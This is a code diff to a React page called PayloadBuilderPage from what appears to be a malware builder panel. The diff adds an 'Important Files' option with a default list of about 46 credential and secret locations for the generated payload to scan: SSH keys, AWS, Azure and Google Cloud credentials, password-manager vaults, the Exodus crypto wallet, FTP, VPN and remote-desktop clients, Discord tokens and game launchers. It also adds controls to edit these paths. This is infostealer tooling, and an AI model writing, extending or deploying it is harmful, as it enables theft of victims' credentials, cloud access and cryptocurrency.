@@ -22,7 +22,7 @@ import {
     FormControl,
     InputLabel
 } from '@mui/material';
-import { Download as DownloadIcon, Build as BuildIcon, ExpandMore as ExpandMoreIcon, Image as ImageIcon } from '@mui/icons-material';
+import { Download as DownloadIcon, Build as BuildIcon, ExpandMore as ExpandMoreIcon, Image as ImageIcon, Folder as FolderIcon, Switch as SwitchIcon } from '@mui/icons-material';
 
 function PayloadBuilderPage() {
     const [selectedFeatures, setSelectedFeatures] = useState({
@@ -53,6 +53,58 @@ function PayloadBuilderPage() {
         copyright: '',
         requestedExecutionLevel: ''
     });
+
+    // Default important files configuration
+    const defaultImportantFiles = [
+        { appName: 'FileZilla', path: '%APPDATA%\\FileZilla', enabled: true },
+        { appName: 'Steam', path: '%LOCALAPPDATA%\\Steam', enabled: true },
+        { appName: 'Outlook', path: '%LOCALAPPDATA%\\Microsoft\\Outlook', enabled: true },
+        { appName: 'Thunderbird', path: '%APPDATA%\\Thunderbird\\Profiles', enabled: true },
+        { appName: 'WinSCP', path: '%APPDATA%\\WinSCP', enabled: true },
+        { appName: 'CiscoVPN', path: 'C:\\ProgramData\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Profile', enabled: true },
+        { appName: 'OpenVPN', path: '%USERPROFILE%\\OpenVPN\\config', enabled: true },
+        { appName: 'HeidiSQL', path: '%APPDATA%\\HeidiSQL', enabled: true },
+        { appName: 'DBeaver', path: '%APPDATA%\\DBeaverData\\General', enabled: true },
+        { appName: 'VSCode', path: '%APPDATA%\\Code\\User', enabled: true },
+        { appName: 'Git', path: '%USERPROFILE%', enabled: true },
+        { appName: 'KeePass', path: '%USERPROFILE%\\Documents', enabled: true },
+        { appName: 'Discord', path: '%APPDATA%\\Discord\\Local Storage\\leveldb', enabled: true },
+        { appName: 'TeamViewer', path: '%APPDATA%\\TeamViewer', enabled: true },
+        { appName: 'RemoteDesktop', path: '%USERPROFILE%\\Documents', enabled: true },
+        { appName: 'Cyberduck', path: '%APPDATA%\\Cyberduck', enabled: true },
+        { appName: '7Zip', path: '%APPDATA%\\7-Zip', enabled: true },
+        { appName: 'Norton', path: '%LOCALAPPDATA%\\Norton', enabled: true },
+        { appName: 'Origin', path: 'C:\\ProgramData\\Origin', enabled: true },
+        { appName: 'PrismLauncher', path: '%APPDATA%\\PrismLauncher', enabled: true },
+        { appName: 'MultiMC', path: '%USERPROFILE%\\Desktop\\MultiMC', enabled: true },
+        { appName: 'LunarClient', path: '%USERPROFILE%\\.lunarclient\\settings\\game', enabled: true },
+        { appName: 'Feather', path: '%APPDATA%\\.feather', enabled: true },
+        { appName: 'TLauncher', path: '%APPDATA%\\.minecraft', enabled: true },
+        { appName: 'Essential', path: '%APPDATA%\\.minecraft\\essential', enabled: true },
+        { appName: 'ATLauncher', path: '%APPDATA%\\ATLauncher\\configs', enabled: true },
+        { appName: '1Password', path: '%LOCALAPPDATA%\\1Password', enabled: true },
+        { appName: 'AnyDesk', path: '%APPDATA%\\AnyDesk', enabled: true },
+        { appName: 'AutoFTPManager', path: '%LOCALAPPDATA%\\DeskShareData\\AutoFTPManager', enabled: true },
+        { appName: 'CloudCredentials', path: '%USERPROFILE%\\.azure', enabled: true },
+        { appName: 'Bitwarden', path: '%APPDATA%\\Bitwarden', enabled: true },
+        { appName: 'FTPManagerLite', path: '%LOCALAPPDATA%\\DeskShareData\\FTPManagerLite', enabled: true },
+        { appName: 'FTPRush', path: '%APPDATA%\\FTPRush', enabled: true },
+        { appName: 'GoogleCloud', path: '%APPDATA%\\gcloud', enabled: true },
+        { appName: 'NordPass', path: '%APPDATA%\\NordPass', enabled: true },
+        { appName: 'NordVPN', path: '%LOCALAPPDATA%\\NordVPN', enabled: true },
+        { appName: 'ProtonVPN', path: '%LOCALAPPDATA%\\ProtonVPN', enabled: true },
+        { appName: 'RealVNC', path: '%APPDATA%\\RealVNC', enabled: true },
+        { appName: 'SmartFTP', path: '%APPDATA%\\SmartFTP\\Client2.0\\Favorites', enabled: true },
+        { appName: 'TightVNC', path: '%APPDATA%\\TightVNC', enabled: true },
+        { appName: 'TotalCommander', path: '%APPDATA%\\GHISLER', enabled: true },
+        { appName: 'UltraVNC', path: '%APPDATA%\\UltraVNC', enabled: true },
+        { appName: 'ExodusWallet', path: '%APPDATA%\\Exodus\\exodus.wallet', enabled: true },
+        { appName: 'RiotGames', path: '%LOCALAPPDATA%\\Riot Games\\Riot Client\\Data', enabled: true },
+        { appName: 'SSH', path: '%USERPROFILE%\\.ssh', enabled: true },
+        { appName: 'AWS', path: '%USERPROFILE%\\.aws', enabled: true }
+    ];
+
+    const [importantFilesConfig, setImportantFilesConfig] = useState(defaultImportantFiles);
 
     useEffect(() => {
         // Get current user info
@@ -186,6 +238,11 @@ function PayloadBuilderPage() {
             formData.append('features', JSON.stringify(selectedFeatures));
             formData.append('user', userInfo?.username || '');
             formData.append('outputName', finalOutputName);
+            
+            // Add important files configuration if enabled
+            if (selectedFeatures.importantFiles) {
+                formData.append('importantFilesConfig', JSON.stringify(importantFilesConfig));
+            }
             
             // Add file metadata
             if (fileMetadata.description) formData.append('description', fileMetadata.description);
@@ -378,6 +435,102 @@ function PayloadBuilderPage() {
                 </Box>
 
                 <Divider sx={{ my: 3 }} />
+
+                {selectedFeatures.importantFiles && (
+                    <Accordion sx={{ mb: 2 }}>
+                        <AccordionSummary expandIcon={<ExpandMoreIcon />}>
+                            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
+                                <FolderIcon />
+                                <Typography variant="h6">Important Files Configuration</Typography>
+                                <Chip 
+                                    label={`${importantFilesConfig.filter(f => f.enabled).length}/${importantFilesConfig.length} enabled`}
+                                    size="small"
+                                    sx={{ ml: 2 }}
+                                />
+                            </Box>
+                        </AccordionSummary>
+                        <AccordionDetails>
+                            <Box sx={{ maxHeight: 400, overflowY: 'auto', pr: 1 }}>
+                                <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 2 }}>
+                                    <Typography variant="subtitle2" color="text.secondary">
+                                        Select which apps to scan and customize their paths
+                                    </Typography>
+                                    <Box sx={{ display: 'flex', gap: 1 }}>
+                                        <Button
+                                            size="small"
+                                            onClick={() => {
+                                                setImportantFilesConfig(prev => 
+                                                    prev.map(item => ({ ...item, enabled: true }))
+                                                );
+                                            }}
+                                        >
+                                            Enable All
+                                        </Button>
+                                        <Button
+                                            size="small"
+                                            onClick={() => {
+                                                setImportantFilesConfig(prev => 
+                                                    prev.map(item => ({ ...item, enabled: false }))
+                                                );
+                                            }}
+                                        >
+                                            Disable All
+                                        </Button>
+                                    </Box>
+                                </Box>
+                                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
+                                    {importantFilesConfig.map((file, index) => (
+                                        <Box 
+                                            key={file.appName}
+                                            sx={{ 
+                                                display: 'flex', 
+                                                alignItems: 'center', 
+                                                gap: 2,
+                                                p: 1.5,
+                                                border: '1px solid',
+                                                borderColor: 'divider',
+                                                borderRadius: 1,
+                                                bgcolor: file.enabled ? 'background.paper' : 'action.hover'
+                                            }}
+                                        >
+                                            <FormControlLabel
+                                                control={
+                                                    <Checkbox
+                                                        checked={file.enabled}
+                                                        onChange={(e) => {
+                                                            const newConfig = [...importantFilesConfig];
+                                                            newConfig[index].enabled = e.target.checked;
+                                                            setImportantFilesConfig(newConfig);
+                                                        }}
+                                                        color="primary"
+                                                    />
+                                                }
+                                                label={
+                                                    <Typography variant="body2" sx={{ minWidth: 150, fontWeight: 'medium' }}>
+                                                        {file.appName}
+                                                    </Typography>
+                                                }
+                                            />
+                                            <TextField
+                                                fullWidth
+                                                size="small"
+                                                value={file.path}
+                                                onChange={(e) => {
+                                                    const newConfig = [...importantFilesConfig];
+                                                    newConfig[index].path = e.target.value;
+                                                    setImportantFilesConfig(newConfig);
+                                                }}
+                                                disabled={!file.enabled}
+                                                placeholder="Enter path..."
+                                                helperText={file.enabled ? "Path to scan (supports %APPDATA%, %USERPROFILE%, etc.)" : ""}
+                                            />
+                                        </Box>
+                                    ))}
+                                </Box>
+                            </Box>
+                        </AccordionDetails>
+                    </Accordion>
+                )}
 
                 <Accordion>
                     <AccordionSummary expandIcon={<ExpandMoreIcon />}>
